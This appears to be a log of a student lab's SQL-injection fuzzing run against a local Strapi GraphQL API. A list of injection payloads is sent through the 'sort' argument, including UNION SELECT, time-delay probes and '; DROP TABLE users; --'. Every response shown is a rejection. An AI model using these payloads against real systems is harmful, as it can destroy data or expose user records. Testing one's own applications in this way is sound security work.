+[>] Testing usersPermissionsUsers (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { usersPermissionsUsers(sort: " '") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { usersPermissionsUsers(sort: "' OR '1'='1") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { usersPermissionsUsers(sort: "' OR 1=1--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { usersPermissionsUsers(sort: "' OR 'a'='a") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { usersPermissionsUsers(sort: "' UNION SELECT NULL--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { usersPermissionsUsers(sort: "'; DROP TABLE users; --") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { usersPermissionsUsers(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { usersPermissionsUsers(sort: "') OR ('1'='1") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { usersPermissionsUsers(sort: "admin' --") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { usersPermissionsUsers(sort: "' OR sleep(5)--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { usersPermissionsUsers(sort: "' AND sleep(5)--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { usersPermissionsUsers(sort: "' WAITFOR DELAY '0:0:5'--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { usersPermissionsUsers(sort: "' OR 'x'='x' /*") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { usersPermissionsUsers(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { usersPermissionsUsers(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId username } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsUsers"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+[>] Testing articles_connection (string args: ['sort'])
+
+[>] Testing articles (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { articles(sort: " '") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key '","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key '","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key '","details":{"key":"'","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { articles(sort: "' OR '1'='1") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' OR '1'='1","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR '1'='1","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR '1'='1","details":{"key":"' OR '1'='1","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { articles(sort: "' OR 1=1--") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' OR 1=1--","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 1=1--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 1=1--","details":{"key":"' OR 1=1--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { articles(sort: "' OR 'a'='a") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' OR 'a'='a","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 'a'='a","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 'a'='a","details":{"key":"' OR 'a'='a","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { articles(sort: "' UNION SELECT NULL--") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' UNION SELECT NULL--","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' UNION SELECT NULL--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' UNION SELECT NULL--","details":{"key":"' UNION SELECT NULL--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { articles(sort: "'; DROP TABLE users; --") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key '; DROP TABLE users; --","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key '; DROP TABLE users; --","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key '; DROP TABLE users; --","details":{"key":"'; DROP TABLE users; --","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { articles(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' AND 1=0 UNION SELECT NULL","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND 1=0 UNION SELECT NULL","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:18:71","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:18:53","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29"],"error":{"name":"ValidationError","message":"Invalid key ' AND 1=0 UNION SELECT NULL","details":{"key":"' AND 1=0 UNION SELECT NULL","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { articles(sort: "') OR ('1'='1") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ') OR ('1'='1","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ') OR ('1'='1","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ') OR ('1'='1","details":{"key":"') OR ('1'='1","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { articles(sort: "admin' --") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key admin' --","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key admin' --","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key admin' --","details":{"key":"admin' --","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { articles(sort: "' OR sleep(5)--") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' OR sleep(5)--","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR sleep(5)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR sleep(5)--","details":{"key":"' OR sleep(5)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { articles(sort: "' AND sleep(5)--") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' AND sleep(5)--","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND sleep(5)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' AND sleep(5)--","details":{"key":"' AND sleep(5)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { articles(sort: "' WAITFOR DELAY '0:0:5'--") { documentId title } }
